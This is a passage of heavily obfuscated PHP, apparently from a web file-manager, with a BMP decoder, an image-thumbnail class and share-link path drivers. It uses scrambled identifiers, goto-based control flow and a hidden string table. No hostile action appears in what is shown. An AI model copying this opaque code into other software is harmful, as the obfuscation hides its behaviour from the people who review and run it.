$FğÒ½ˆ¸Ñà = $AãÌ‡ä“’ = $E˜ÏÀ²ôøõ = $a‡µéğù ê = 0; $DŠ·œİÎ…Œ = 16711680; $BíÁµ¼Àƒµ = 65280; goto e†‹ø˜Š·¿; dïÃğ•’Ÿç: } else { if (124 < $B»×Ø‘¢¹Á || $B»×Ø‘¢¹Á < 40) { return !1; } else { goto f˜–…§Ú‡Ò; B¤ñÂ«é: if ($EØ÷æË¾Š & 2147483648) { $EØ÷æË¾Š = -(~$EØ÷æË¾Š & 4294967295) - 1; } if ($D³¨¨ˆ† & 2147483648) { $D³¨¨ˆ† = -(~$D³¨¨ˆ† & 4294967295) - 1; } if ($bËãˆ÷  & 2147483648) { $bËãˆ÷  = -(~$bËãˆ÷  & 4294967295) - 1; } goto b©ˆªÚ¤ƒÖ; B¾ÓƒãáØÍ: if (($e¤ªÜ†…½ == 16 || $e¤ªÜ†…½ == 24 || $e¤ªÜ†…½ == 32) && $a‡µéğù ê == 0 && $DŠ·œİÎ…Œ == 0 && $BíÁµ¼Àƒµ == 0 && $cÅ˜âÄ†À == 0) { switch ($e¤ªÜ†…½) { case 16: $DŠ·œİÎ…Œ = 31744; $BíÁµ¼Àƒµ = 992; $cÅ˜âÄ†À = 31; break; case 24: case 32: $DŠ·œİÎ…Œ = 16711680; $BíÁµ¼Àƒµ = 65280; $cÅ˜âÄ†À = 255; break; } } goto DÏ­©åÏ‘³; b©ˆªÚ¤ƒÖ: if ($Fî‡¾£Ğ & 2147483648) { $Fî‡¾£Ğ = -(~$Fî‡¾£Ğ & 4294967295) - 1; } if ($e¶öŞ‚‘¨¹[$b•¨µÅß¼[520]] != 0) { $A˜¸ƒˆàå  = $e¤ªÜ†…½ == 1 || $e¤ªÜ†…½ == 4 || $e¤ªÜ†…½ == 8 ? ($FğÒ½ˆ¸Ñà ? $FğÒ½ˆ¸Ñà : pow(2, $e¤ªÜ†…½)) << 2 : 0; $Bî–”¨Ğ = $Añù½½îİ´ ? $Añù½½îİ´ : ($EØ÷æË¾Š * $e¤ªÜ†…½ + 31 >> 3 & ~3) * abs($D³¨¨ˆ†); $dØùÊì¡‹Ö = $e¶öŞ‚‘¨¹[$b•¨µÅß¼[520]] - $Bî–”¨Ğ - $A˜¸ƒˆàå  - 14; if ($B»×Ø‘¢¹Á < $dØùÊì¡‹Ö && 40 <= $B»×Ø‘¢¹Á && $B»×Ø‘¢¹Á <= 124) { $B»×Ø‘¢¹Á = $dØùÊì¡‹Ö; } } if ($B»×Ø‘¢¹Á - 40 > 0) { $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $B»×Ø‘¢¹Á - 40); if ($C¸“÷æ…ËŒ === !1) { return !1; } extract(unpack($b•¨µÅß¼[1853] . $b•¨µÅß¼[1854] . $b•¨µÅß¼[1855] . $b•¨µÅß¼[1856], $C¸“÷æ…ËŒ . str_repeat($b•¨µÅß¼[1857], 120))); } else { $E˜ÏÀ²ôøõ = $DŠ·œİÎ…Œ = $BíÁµ¼Àƒµ = $cÅ˜âÄ†À = 0; } goto B¾ÓƒãáØÍ; f˜–…§Ú‡Ò: $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, 36); if ($C¸“÷æ…ËŒ === !1) { return !1; } extract(unpack($b•¨µÅß¼[1844] . $b•¨µÅß¼[1845] . $b•¨µÅß¼[1842] . $b•¨µÅß¼[1846] . $b•¨µÅß¼[1847] . $b•¨µÅß¼[1848] . $b•¨µÅß¼[1849] . $b•¨µÅß¼[1850] . $b•¨µÅß¼[1851] . $b•¨µÅß¼[1852], $C¸“÷æ…ËŒ)); goto B¤ñÂ«é; DÏ­©åÏ‘³: } } goto Eõ‹œ§Ï‹ñ; C¼í¼Œ“¯¨: $b•¨µÅß¼ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($e¶öŞ‚‘¨¹[$b•¨µÅß¼[388]] != 19778) { return !1; } $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, 4); goto c’ŞèªÔÖ‹; F™®ÇîĞ‡: if ($e¤ªÜ†…½ == 1 || $e¤ªÜ†…½ == 4 || $e¤ªÜ†…½ == 8) { goto bóéöÊ…‚¦; aª’†¨ : $e†Û‘Ê¼ = array(); for ($B«ÊÊª„†® = 0; $B«ÊÊª„†® < $bÖ›ğã§²œ; ++$B«ÊÊª„†®) { $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $c†¯—çÅ¢æ); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } extract(unpack($b•¨µÅß¼[1858], $C¸“÷æ…ËŒ . $b•¨µÅß¼[1857])); $e†Û‘Ê¼[] = imagecolorallocate($EÄ„½İò°İ, $b¶Ú¶Êœêİ, $e©ô¹¹ªŠ, $C‚ÀÎÙêæÒ); } $eÄ àèĞ = 8 - $e¤ªÜ†…½; goto cŸ‘öù²‚Ã; cŸ‘öù²‚Ã: $f¬º´ÈŠ…Ø = (1 << $e¤ªÜ†…½) - 1 << $eÄ àèĞ; if ($a‡µéğù ê == 1 || $a‡µéğù ê == 2) { $dÑÊ‹³“ = 0; $fƒÆæâÒ—Ÿ = $e¤ªÜ†…½ >> 2 & 1; for (;;) { if ($dÑÊ‹³“ < -1 || $dÑÊ‹³“ > $EØ÷æË¾Š || $e«ïƒšÛ´Ó < -1 || $e«ïƒšÛ´Ó > $D³¨¨ˆ†) { imagedestroy($EÄ„½İò°İ); return !1; } $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, 1); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } switch ($C¸“÷æ…ËŒ) { case $b•¨µÅß¼[1857]: $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, 1); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } switch ($C¸“÷æ…ËŒ) { case $b•¨µÅß¼[1857]: $e«ïƒšÛ´Ó += $CøŒÀÈ “”; $dÑÊ‹³“ = 0; break; case $b•¨µÅß¼[1859]: $e«ïƒšÛ´Ó = 0; $dÑÊ‹³“ = 0; break 3; case $b•¨µÅß¼[1860]: $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, 2); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } list(, $fĞ“”š“ÎŠ, $fîƒ£‘‘ÕŒ) = unpack($b•¨µÅß¼[1861], $C¸“÷æ…ËŒ); $dÑÊ‹³“ += $fĞ“”š“ÎŠ; $e«ïƒšÛ´Ó += $fîƒ£‘‘ÕŒ * $CøŒÀÈ “”; break; default: list(, $aºçŸÑº”³) = unpack($b•¨µÅß¼[1862], $C¸“÷æ…ËŒ); $aø†Šñ˜ = ($aºçŸÑº”³ >> $fƒÆæâÒ—Ÿ) + ($aºçŸÑº”³ & $fƒÆæâÒ—Ÿ); $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $aø†Šñ˜ + 1 & ~1); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } for ($B«ÊÊª„†® = 0, $EË–›ŸÉì‡ = 0; $B«ÊÊª„†® < $aºçŸÑº”³; ++$B«ÊÊª„†®, ++$dÑÊ‹³“, $EË–›ŸÉì‡ += $e¤ªÜ†…½) { list(, $FÎİÍöÀÚÜ) = unpack($b•¨µÅß¼[1862], $C¸“÷æ…ËŒ[$EË–›ŸÉì‡ >> 3]); $C‚ÀÎÙêæÒ = $EË–›ŸÉì‡ & 7; imagesetpixel($EÄ„½İò°İ, $dÑÊ‹³“, $e«ïƒšÛ´Ó, $e†Û‘Ê¼[($FÎİÍöÀÚÜ & $f¬º´ÈŠ…Ø >> $C‚ÀÎÙêæÒ) >> $eÄ àèĞ - $C‚ÀÎÙêæÒ]); } break; } break; default: $a‹¼¸ˆ±¨ƒ = fread($c‡âØ™àå¬, 1); if ($a‹¼¸ˆ±¨ƒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } list(, $aáÙ‰ÎÛà, $FÎİÍöÀÚÜ) = unpack($b•¨µÅß¼[1861], $C¸“÷æ…ËŒ . $a‹¼¸ˆ±¨ƒ); for ($B«ÊÊª„†® = 0, $EË–›ŸÉì‡ = 0; $B«ÊÊª„†® < $aáÙ‰ÎÛà; ++$B«ÊÊª„†®, ++$dÑÊ‹³“, $EË–›ŸÉì‡ += $e¤ªÜ†…½) { $C‚ÀÎÙêæÒ = $EË–›ŸÉì‡ & 7; imagesetpixel($EÄ„½İò°İ, $dÑÊ‹³“, $e«ïƒšÛ´Ó, $e†Û‘Ê¼[($FÎİÍöÀÚÜ & $f¬º´ÈŠ…Ø >> $C‚ÀÎÙêæÒ) >> $eÄ àèĞ - $C‚ÀÎÙêæÒ]); } break; } } } else { for ($DÊò Ëê‹– = 0; $DÊò Ëê‹– < $a¤àæ¼†£; ++$DÊò Ëê‹–, $e«ïƒšÛ´Ó += $CøŒÀÈ “”) { $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $D‚ô¯ÅÁµ°); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } $EË–›ŸÉì‡ = 0; for ($dÑÊ‹³“ = 0; $dÑÊ‹³“ < $EØ÷æË¾Š; ++$dÑÊ‹³“, $EË–›ŸÉì‡ += $e¤ªÜ†…½) { list(, $FÎİÍöÀÚÜ) = unpack($b•¨µÅß¼[1862], $C¸“÷æ…ËŒ[$EË–›ŸÉì‡ >> 3]); $C‚ÀÎÙêæÒ = $EË–›ŸÉì‡ & 7; imagesetpixel($EÄ„½İò°İ, $dÑÊ‹³“, $e«ïƒšÛ´Ó, $e†Û‘Ê¼[($FÎİÍöÀÚÜ & $f¬º´ÈŠ…Ø >> $C‚ÀÎÙêæÒ) >> $eÄ àèĞ - $C‚ÀÎÙêæÒ]); } } } goto aœÙÄì»Ä; bóéöÊ…‚¦: $EÄ„½İò°İ = imagecreate($EØ÷æË¾Š, $a¤àæ¼†£); $c†¯—çÅ¢æ = $B»×Ø‘¢¹Á == 12 ? 3 : 4; $bÖ›ğã§²œ = $FğÒ½ˆ¸Ñà ? $FğÒ½ˆ¸Ñà : pow(2, $e¤ªÜ†…½); goto aª’†¨ ; aœÙÄì»Ä: } else { goto CÉÒò†ƒ„; D³½Ñ¶¼¨À: for ($DÊò Ëê‹– = 0; $DÊò Ëê‹– < $a¤àæ¼†£; ++$DÊò Ëê‹–, $e«ïƒšÛ´Ó += $CøŒÀÈ “”) { $C¸“÷æ…ËŒ = fread($c‡âØ™àå¬, $D‚ô¯ÅÁµ°); if ($C¸“÷æ…ËŒ === !1) { imagedestroy($EÄ„½İò°İ); return !1; } $EË–›ŸÉì‡ = 0; for ($dÑÊ‹³“ = 0; $dÑÊ‹³“ < $EØ÷æË¾Š; ++$dÑÊ‹³“, $EË–›ŸÉì‡ += $dÌ†¯¥”Å) { list(, $FÎİÍöÀÚÜ) = unpack($b•¨µÅß¼[1839], substr($C¸“÷æ…ËŒ, $EË–›ŸÉì‡, $dÌ†¯¥”Å) . $b•¨µÅß¼[1863]); $c«†‰¼ÙšÍ = $FÎİÍöÀÚÜ & $E˜ÏÀ²ôøõ; $C´ÆÅãÙ³ˆ = $FÎİÍöÀÚÜ & $DŠ·œİÎ…Œ; $F‡â••†§Ã = $FÎİÍöÀÚÜ & $BíÁµ¼Àƒµ; $DçåÌÕÅÖã = $FÎİÍöÀÚÜ & $cÅ˜âÄ†À; $E´ƒâÚ½¹‚ = $c‡¤…¿©Û - (($c«†‰¼ÙšÍ << 7) - $c«†‰¼ÙšÍ) * $E‹åÀğ¹Ûµ; $b¶Ú¶Êœêİ = (($C´ÆÅãÙ³ˆ << 8) - $C´ÆÅãÙ³ˆ) * $e“†ÒÑİ‹Ë; $e©ô¹¹ªŠ = (($F‡â••†§Ã << 8) - $F‡â••†§Ã) * $EÁ¯Ó……Šğ; $C‚ÀÎÙêæÒ = (($DçåÌÕÅÖã << 8) - $DçåÌÕÅÖã) * $f‚Õ«µ™ÍŒ; imagesetpixel($EÄ„½İò°İ, $dÑÊ‹³“, $e«ïƒšÛ´Ó, $E´ƒâÚ½¹‚ << 24 | $b¶Ú¶Êœêİ << 16 | $e©ô¹¹ªŠ << 8 | $C‚ÀÎÙêæÒ); } } imagealphablending($EÄ„½İò°İ, !0); goto Aİ¬ÇÓµÙ–; fó—¢Âäñ: $e“†ÒÑİ‹Ë = $DŠ·œİÎ…Œ ? 1 / $DŠ·œİÎ…Œ : 1; $EÁ¯Ó……Šğ = $BíÁµ¼Àƒµ ? 1 / $BíÁµ¼Àƒµ : 1; $f‚Õ«µ™ÍŒ = $cÅ˜âÄ†À ? 1 / $cÅ˜âÄ†À : 1; goto D³½Ñ¶¼¨À; CÉÒò†ƒ„: $EÄ„½İò°İ = imagecreatetruecolor($EØ÷æË¾Š, $a¤àæ¼†£); imagealphablending($EÄ„½İò°İ, !1); if ($E˜ÏÀ²ôøõ) { imagesavealpha($EÄ„½İò°İ, !0); } goto f„´‘·¥Ìí; f„´‘·¥Ìí: $dÌ†¯¥”Å = $e¤ªÜ†…½ >> 3; $c‡¤…¿©Û = $E˜ÏÀ²ôøõ ? 127 : 0; $E‹åÀğ¹Ûµ = $E˜ÏÀ²ôøõ ? 1 / $E˜ÏÀ²ôøõ : 1; goto fó—¢Âäñ; Aİ¬ÇÓµÙ–: } return $EÄ„½İò°İ; goto f¢“İÏ¹‹”; BàŸâÒ¸Å‚: $a¤àæ¼†£ = abs($D³¨¨ˆ†); $e«ïƒšÛ´Ó = $D³¨¨ˆ† > 0 ? $a¤àæ¼†£ - 1 : 0; $CøŒÀÈ “” = $D³¨¨ˆ† > 0 ? -1 : 1; goto F™®ÇîĞ‡; f¢“İÏ¹‹”: } } class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($EëÄÃ¹Š¯¯, $A”£É‹Æ) { goto c–÷”Â›°; A”¦ÃÖÀÔš: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto b¡÷ò³½¡; Aİªß©Œ°„: if (!$this->im) { return !1; } $A°‚Ğùñ†“ = $_SERVER[¼€¼ˆ¦‚¡][33]; $this->imgData = GetImageSize($EëÄÃ¹Š¯¯, $A°‚Ğùñ†“); goto A”¦ÃÖÀÔš; c–÷”Â›°: $this->srcFile = $EëÄÃ¹Š¯¯; $this->echoType = $A”£É‹Æ; $this->im = self::image($EëÄÃ¹Š¯¯); goto Aİªß©Œ°„; b¡÷ò³½¡: } public static function image($f£”Ó‰‹²) { $BÙğç¬Ô¿÷ =& $_SERVER[¼€¼ˆ¦‚¡]; $DÁ¿ÇïÀï‘ = $BÙğç¬Ô¿÷[33]; $dÊÓ‡Ù‚œó = GetImageSize($f£”Ó‰‹², $DÁ¿ÇïÀï‘); $dµÏ¶›‘¶ = !1; switch ($dÊÓ‡Ù‚œó[2]) { case IMAGETYPE_GIF: if (!function_exists($BÙğç¬Ô¿÷[1864])) { break; } $dµÏ¶›‘¶ = imagecreatefromgif($f£”Ó‰‹²); break; case IMAGETYPE_JPEG: if (!function_exists($BÙğç¬Ô¿÷[1865])) { break; } $dµÏ¶›‘¶ = imagecreatefromjpeg($f£”Ó‰‹²); break; case IMAGETYPE_PNG: if (!function_exists($BÙğç¬Ô¿÷[1866])) { break; } $dµÏ¶›‘¶ = @imagecreatefrompng($f£”Ó‰‹²); imagesavealpha($dµÏ¶›‘¶, !0); break; case IMAGETYPE_XBM: $dµÏ¶›‘¶ = imagecreatefromxbm($f£”Ó‰‹²); break; case IMAGETYPE_WBMP: $dµÏ¶›‘¶ = imagecreatefromwbmp($f£”Ó‰‹²); break; case IMAGETYPE_BMP: $dµÏ¶›‘¶ = imagecreatefrombmp($f£”Ó‰‹²); break; default: break; } return $dµÏ¶›‘¶; } public static function imageSize($bÉñâòËº¿) { $fŠ¤Æšİ£ë =& $_SERVER[¼€¼ˆ¦‚¡]; $døé«îó« = GetImageSize($bÉñâòËº¿); if (!$døé«îó«) { return !1; } return array($fŠ¤Æšİ£ë[1867] => $døé«îó«[0], $fŠ¤Æšİ£ë[1868] => $døé«îó«[1]); } function distortion($Dõ×šŠíïÖ, $b¿õ¶­İ Á, $b‘ñ«ù÷ÃÓ) { $Aù¤èáèù‡ = $this->creatImage($this->im, $b¿õ¶­İ Á, $b‘ñ«ù÷ÃÓ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Aù¤èáèù‡, $Dõ×šŠíïÖ); } function prorate($AÀˆÃœí, $fÌÎÁ™È§À, $DñÓÉ×ÒÌ×) { $cÅÙÃ†ˆ‰õ = $fÌÎÁ™È§À / $DñÓÉ×ÒÌ×; $eÂ«³ñ³º = $this->srcW / $this->srcH; if ($cÅÙÃ†ˆ‰õ <= $eÂ«³ñ³º) { $EŞ‡Ãöğ¯  = $fÌÎÁ™È§À; $d¶„ÁïË–’ = $EŞ‡Ãöğ¯  * ($this->srcH / $this->srcW); } else { $d¶„ÁïË–’ = $DñÓÉ×ÒÌ×; $EŞ‡Ãöğ¯  = $d¶„ÁïË–’ * ($this->srcW / $this->srcH); } if ($this->srcW > $fÌÎÁ™È§À || $this->srcH > $DñÓÉ×ÒÌ×) { $fíí®¿õÄÁ = $this->creatImage($this->im, $EŞ‡Ãöğ¯ , $d¶„ÁïË–’, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($fíí®¿õÄÁ, $AÀˆÃœí); } else { $fíí®¿õÄÁ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($fíí®¿õÄÁ, $AÀˆÃœí); } } function cut($cÆë¿ãÆµ, $Bµ¦“ÕĞ, $BˆºáÄÇ„”) { goto fØìŠòĞİè; fØìŠòĞİè: $A…µ›ÁãØ¯ = $Bµ¦“ÕĞ / $BˆºáÄÇ„”; $C©´£›‰²É = $this->srcW / $this->srcH; if ($A…µ›ÁãØ¯ <= $C©´£›‰²É) { $b‰ä…©Ù‚„ = $BˆºáÄÇ„”; $BÓã±²šïÛ = $b‰ä…©Ù‚„ * ($this->srcW / $this->srcH); } else { $BÓã±²šïÛ = $Bµ¦“ÕĞ; $b‰ä…©Ù‚„ = $BÓã±²šïÛ * ($this->srcH / $this->srcW); } goto D§–õ›áù¡; e£Ù‘ŸŒº: return $this->echoImage($f Í¾¤¯Û, $cÆë¿ãÆµ); goto b³šİµŠ§; D§–õ›áù¡: $f»ò×–éï = $this->creatImage($this->im, $BÓã±²šïÛ, $b‰ä…©Ù‚„, 0, 0, 0, 0, $this->srcW, $this->srcH); $f Í¾¤¯Û = $this->creatImage($f»ò×–éï, $Bµ¦“ÕĞ, $BˆºáÄÇ„”, 0, 0, ($BÓã±²šïÛ - $Bµ¦“ÕĞ) / 2, ($b‰ä…©Ù‚„ - $BˆºáÄÇ„”) / 2, $Bµ¦“ÕĞ, $BˆºáÄÇ„”); imageDestroy($f»ò×–éï); goto e£Ù‘ŸŒº; b³šİµŠ§: } function backFill($bíõ´ÌŠÎ, $FÁ§ÈÜéê, $Cº†º›†ˆ, $CÓÛäëì‰ = false, $d¨‘³ÕŸññ = 255, $E•Í¶ò©‹õ = 255, $dÍ­µ˜é¬Ä = 255) { goto d–¯«òÒæÕ; fÃôÂˆ¶‡õ: if (function_exists($_SERVER[¼€¼ˆ¦‚¡][1869])) { @($a“¤­š¬½™ = imageCreateTrueColor($FÁ§ÈÜéê, $Cº†º›†ˆ)); if (!$a“¤­š¬½™) { $a“¤­š¬½™ = imageCreate($FÁ§ÈÜéê, $Cº†º›†ˆ); } } else { $a“¤­š¬½™ = imageCreate($FÁ§ÈÜéê, $Cº†º›†ˆ); } $f½†ó†¹±Œ = ($Cº†º›†ˆ - $E†‹ã‹Û‰é) / 2; $AˆÆ÷Îã’Í = imagecolorallocate($a“¤­š¬½™, $d¨‘³ÕŸññ, $E•Í¶ò©‹õ, $dÍ­µ˜é¬Ä); goto A´ã‘ë‰™Á; fªŸ×œö†¨: return $this->echoImage($a“¤­š¬½™, $bíõ´ÌŠÎ); goto e…¤ÆÒ; d–¯«òÒæÕ: $aø•Èæ…ö = $FÁ§ÈÜéê / $Cº†º›†ˆ; $AÇÜîÆÆé» = $this->srcW / $this->srcH; if ($aø•Èæ…ö <= $AÇÜîÆÆé») { $E´÷‚«Ü¼ = $FÁ§ÈÜéê; $E†‹ã‹Û‰é = $E´÷‚«Ü¼ * ($this->srcH / $this->srcW); } else { $E†‹ã‹Û‰é = $Cº†º›†ˆ; $E´÷‚«Ü¼ = $E†‹ã‹Û‰é * ($this->srcW / $this->srcH); } goto fÃôÂˆ¶‡õ; A´ã‘ë‰™Á: if ($CÓÛäëì‰) { $AˆÆ÷Îã’Í = imageColorTransparent($a“¤­š¬½™, $AˆÆ÷Îã’Í); $f½†ó†¹±Œ = $Cº†º›†ˆ - $E†‹ã‹Û‰é; } imageFilledRectangle($a“¤­š¬½™, 0, 0, $FÁ§ÈÜéê, $Cº†º›†ˆ, $AˆÆ÷Îã’Í); if ($this->srcW > $FÁ§ÈÜéê || $this->srcH > $Cº†º›†ˆ) { $FéäÍ¹Â– = $this->creatImage($this->im, $E´÷‚«Ü¼, $E†‹ã‹Û‰é, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($E´÷‚«Ü¼ < $FÁ§ÈÜéê) { imageCopy($a“¤­š¬½™, $FéäÍ¹Â–, ($FÁ§ÈÜéê - $E´÷‚«Ü¼) / 2, 0, 0, 0, $E´÷‚«Ü¼, $E†‹ã‹Û‰é); } else { if ($E†‹ã‹Û‰é < $Cº†º›†ˆ) { imageCopy($a“¤­š¬½™, $FéäÍ¹Â–, 0, $f½†ó†¹±Œ, 0, 0, $E´÷‚«Ü¼, $E†‹ã‹Û‰é); } else { imageCopy($a“¤­š¬½™, $FéäÍ¹Â–, 0, 0, 0, 0, $E´÷‚«Ü¼, $E†‹ã‹Û‰é); } } } else { imageCopyMerge($a“¤­š¬½™, $this->im, ($FÁ§ÈÜéê - $E´÷‚«Ü¼) / 2, $f½†ó†¹±Œ, 0, 0, $E´÷‚«Ü¼, $E†‹ã‹Û‰é, 100); } goto fªŸ×œö†¨; e…¤ÆÒ: } function creatImage($cšõÖî…Ø£, $f¯©­á¢ªê, $aÇÕ¼ìÊ¥, $C¤ë¢çÑàê, $BèáÌç³Ç, $f„Ò¦îáó, $a‚ºë³õ‘, $fØºÇÀÖÕƒ, $A©¾²Ü¾Îç) { if (function_exists($_SERVER[¼€¼ˆ¦‚¡][1869])) { @($d½‡‘ìß§– = ImageCreateTrueColor($f¯©­á¢ªê, $aÇÕ¼ìÊ¥)); @imagealphablending($d½‡‘ìß§–, !1); @imagesavealpha($d½‡‘ìß§–, !0); if ($d½‡‘ìß§–) { imageCopyResampled($d½‡‘ìß§–, $cšõÖî…Ø£, $C¤ë¢çÑàê, $BèáÌç³Ç, $f„Ò¦îáó, $a‚ºë³õ‘, $f¯©­á¢ªê, $aÇÕ¼ìÊ¥, $fØºÇÀÖÕƒ, $A©¾²Ü¾Îç); } else { $d½‡‘ìß§– = ImageCreate($f¯©­á¢ªê, $aÇÕ¼ìÊ¥); imageCopyResized($d½‡‘ìß§–, $cšõÖî…Ø£, $C¤ë¢çÑàê, $BèáÌç³Ç, $f„Ò¦îáó, $a‚ºë³õ‘, $f¯©­á¢ªê, $aÇÕ¼ìÊ¥, $fØºÇÀÖÕƒ, $A©¾²Ü¾Îç); } } else { $d½‡‘ìß§– = ImageCreate($f¯©­á¢ªê, $aÇÕ¼ìÊ¥); imageCopyResized($d½‡‘ìß§–, $cšõÖî…Ø£, $C¤ë¢çÑàê, $BèáÌç³Ç, $f„Ò¦îáó, $a‚ºë³õ‘, $f¯©­á¢ªê, $aÇÕ¼ìÊ¥, $fØºÇÀÖÕƒ, $A©¾²Ü¾Îç); } return $d½‡‘ìß§–; } public function imgRotate($C‘Æ£—±¿, $féø”¾Œ) { goto c—¤º¼Û‹; BåÒ§ĞÉ­í: return $bÇÎä™Ûš; goto bğÙÙÅ´‘‡; c—¤º¼Û‹: if (!$this->im || $féø”¾Œ % 360 === 0 || !function_exists($_SERVER[¼€¼ˆ¦‚¡][1870])) { return !1; } $Fâˆè÷ã† = imageRotate($this->im, 360 - $féø”¾Œ, 0); $bÇÎä™Ûš = !1; goto DßåÑØ¤‚Ò; DßåÑØ¤‚Ò: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $bÇÎä™Ûš = imagegif($Fâˆè÷ã†, $C‘Æ£—±¿); break; case IMAGETYPE_JPEG: $bÇÎä™Ûš = imagejpeg($Fâˆè÷ã†, $C‘Æ£—±¿, 100); break; case IMAGETYPE_PNG: $bÇÎä™Ûš = imagePNG($Fâˆè÷ã†, $C‘Æ£—±¿); break; default: break; } imageDestroy($Fâˆè÷ã†); imageDestroy($this->im); goto BåÒ§ĞÉ­í; bğÙÙÅ´‘‡: } function echoImage($dƒœœ¶Íº, $B‡¤‰æ«’´) { goto dÓ„ÃÇÕ…í; DøÇ¸‚°Š¡: imageDestroy($this->im); return $DÀ†™Å·Â±; goto AŒ…³ŒœĞå; dÓ„ÃÇÕ…í: $f”ñÙ“¸‘“ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$dƒœœ¶Íº) { return !1; } ob_get_clean(); goto D±ÒÒğ½Ùñ; D±ÒÒğ½Ùñ: $DÀ†™Å·Â± = !1; switch ($this->echoType) { case $f”ñÙ“¸‘“[1871]: $DÀ†™Å·Â± = imagePNG($dƒœœ¶Íº); break; case $f”ñÙ“¸‘“[167]: $DÀ†™Å·Â± = imagePNG($dƒœœ¶Íº, $B‡¤‰æ«’´); break; } imageDestroy($dƒœœ¶Íº); goto DøÇ¸‚°Š¡; AŒ…³ŒœĞå: } } goto eÅ‰ŞŠã×ì; FŠâ÷óˆÆƒ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($aìÖİª×ô¹) { $this->pathParse = $aìÖİª×ô¹; $this->model = Model($_SERVER[¼€¼ˆ¦‚¡][1117]); } protected function infoParse($fÄŸœËµ, $E¦›Ëå¾¾ = false, $FË‹…ø¤–‘ = false) { $dâ­¬‹”Œ =& $_SERVER[¼€¼ˆ¦‚¡]; return Action($dâ­¬‹”Œ[1017])->sharePathInfo($this->pathParse[$dâ­¬‹”Œ[75]], !0); } public function listPath($B»°Ú÷‚š², $d½§Í‹Ò»Ã = false) { $A·ç©·œ‰Ä =& $_SERVER[¼€¼ˆ¦‚¡]; $c­ÅÀŠšª = parent::listPath($B»°Ú÷‚š², $d½§Í‹Ò»Ã); foreach ($c­ÅÀŠšª as $fƒÊÆ‹è¶õ => $CŸŞêÂêòè) { if (!in_array($fƒÊÆ‹è¶õ, array($A·ç©·œ‰Ä[73], $A·ç©·œ‰Ä[74]))) { continue; } foreach ($CŸŞêÂêòè as $EÆËöäßÀ => $eº„‚«îè) { $c­ÅÀŠšª[$fƒÊÆ‹è¶õ][$EÆËöäßÀ] = Action($A·ç©·œ‰Ä[1017])->shareItemInfo($eº„‚«îè); } } return $c­ÅÀŠšª; } public function listAll($bÇŒÊ¡èÏ) { $C§·Ê…ºí =& $_SERVER[¼€¼ˆ¦‚¡]; $F¤ŞÉ½çÃÖ = IO::info($this->pathParse[$C§·Ê…ºí[75]]); if (!$F¤ŞÉ½çÃÖ) { return array(); } $C¥†Ã·±Ÿ = $this->model->listAll($bÇŒÊ¡èÏ); foreach ($C¥†Ã·±Ÿ as &$dâìàÑ¦õî) { $dâìàÑ¦õî[$C§·Ê…ºí[391]] = Action($C§·Ê…ºí[1017])->shareItemInfo($dâìàÑ¦õî[$C§·Ê…ºí[391]]); } return $C¥†Ã·±Ÿ; } } class PathDriverDriverShareItem { public function __construct($bßÂéŒˆœÕ) { $this->pathParse = $bßÂéŒˆœÕ; } public function __call($Dë”ñá·½…, $a¢Ğì¨±Ç) { $Dçä†¶ŒĞÀ =& $_SERVER[¼€¼ˆ¦‚¡]; if (method_exists($this, $Dë”ñá·½…)) { return; } $cÚ Ëá†ÛÔ = call_user_func_array(array($Dçä†¶ŒĞÀ[1125], $Dë”ñá·½…), $a¢Ğì¨±Ç); $Fš©‡×°‚ì = array($Dçä†¶ŒĞÀ[1126], $Dçä†¶ŒĞÀ[1127], $Dçä†¶ŒĞÀ[1128], $Dçä†¶ŒĞÀ[1129], $Dçä†¶ŒĞÀ[490], $Dçä†¶ŒĞÀ[492], $Dçä†¶ŒĞÀ[1130], $Dçä†¶ŒĞÀ[103], $Dçä†¶ŒĞÀ[1131], $Dçä†¶ŒĞÀ[1132]); if (in_array($Dë”ñá·½…, $Fš©‡×°‚ì)) { $cÚ Ëá†ÛÔ = $this->getPathOuter($cÚ Ëá†ÛÔ); } return $cÚ Ëá†ÛÔ; } public function copy($FŒß—ˆğ¦, $c´±½ÏÛŠÍ, $C¢œ¤ÈÙš = false) { return $this->copyMove($FŒß—ˆğ¦, $c´±½ÏÛŠÍ, $C¢œ¤ÈÙš, $_SERVER[¼€¼ˆ¦‚¡][490]); } public function move($e¢²‚ÛÎÂ×, $BµÊ‡ò–êÀ, $DË’ö††Û¾ = false) { return $this->copyMove($e¢²‚ÛÎÂ×, $BµÊ‡ò–êÀ, $DË’ö††Û¾, $_SERVER[¼€¼ˆ¦‚¡][492]); } private function copyMove($E®éì†Ô†µ, $bé…©Ù©, $D©ºŞ¤„º¤, $a¸—î¯) { goto b›‘ŠÄŞù†; CÌé»›ÅÀ: if ($Fò·¸¢Ğ«³->pathParse[$fÑ¾ÈŒèÏ´[997]]) { $bé…©Ù© = $Fò·¸¢Ğ«³->pathParse[$fÑ¾ÈŒèÏ´[997]]; } else { $bé…©Ù© = $d‰ƒì²÷óà; } 